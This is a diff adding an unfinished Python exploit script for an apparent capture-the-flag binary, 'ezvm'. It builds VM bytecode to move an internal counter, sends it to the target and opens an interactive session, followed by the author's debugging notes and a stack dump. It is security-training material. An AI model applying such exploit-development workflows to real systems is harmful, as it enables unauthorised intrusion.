@@ -1,0 +1,87 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from time import sleep
+
+exe = context.binary = ELF("./ezvm")
+host = args.HOST or "0.0.0.0"
+port = int(args.PORT or 1337)
+
+gdbscript = """
+tbreak main
+# b *0x000055555555552B
+b *0x0000555555555621
+continue
+""".format(
+    **locals()
+)
+
+libc = SetupLibcELF()
+
+io = start()
+
+
+idk4 = 0
+
+
+def inc_idk4(cnt):
+    global idk4
+    idk4 = idk4 + cnt
+    return b"\x00\x01" * cnt
+
+
+def dec_idk4(cnt):
+    global idk4
+    idk4 = idk4 - cnt
+    return b"\x01\x01" * cnt
+
+
+def set_idk4(cnt):
+    global idk4
+    print(cnt, idk4)
+    if cnt > idk4:
+        print(1)
+        return inc_idk4(cnt - idk4)
+    elif cnt < idk4:
+        print(2)
+        return dec_idk4(idk4 - cnt)
+    elif idk4 == cnt:
+        return b""
+
+
+code = set_idk4(0x8) + set_idk4(0x1)
+
+rl()
+sl(b"FIRST INPUT")
+rl()
+sl(len(code))
+rl()
+sl(0x1337)
+rl()
+pause()
+sl(code)
+io.interactive()
+
+"""
+# init registers
+b *0x000055555555548A
+
+
+struct registers {
+    
+    char *codeBuf
+    char *heapBuf
+    char *something
+    int 
+    int
+}
+
+08:0040│  0x555555559040 —▸ 0x55555555a2a0 ◂— 0x4956414c4c4150 /* 'PALLAVI' */
+09:0048│  0x555555559048 —▸ 0x55555555a4b0 ◂— 0x0
+0a:0050│  0x555555559050 —▸ 0x555555563e70 ◂— 0x0
+0b:0058│  0x555555559058 ◂— 0x1ff
+0c:0060│  0x555555559060 ◂— 0x1337
+
+"""
